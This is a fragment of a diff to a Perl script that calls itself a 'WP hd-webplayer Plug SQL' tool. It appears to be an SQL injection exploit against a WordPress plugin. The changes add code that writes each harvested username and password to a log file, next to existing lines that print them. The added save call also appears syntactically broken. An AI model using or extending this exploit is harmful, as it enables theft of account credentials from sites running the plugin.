@@ -53,9 +53,16 @@ sub fuck{
         print "Username : $found[0]\n";
         print "Password : $found[1]\n";
         print "-" * 30;
+        save ("log.txt",$found[0] : $found[1]);
     }
     
 }
 sub flag {
     print "\n[+] WP hd-webplayer Plug SQL \n[*] Coder => M-A \n\n\n";
+}
+sub save {
+	my ($file,$item) = @_;
+	open(SAVE,">>".$file);
+	print SAVE $item."\n";
+	close(SAVE);
 }
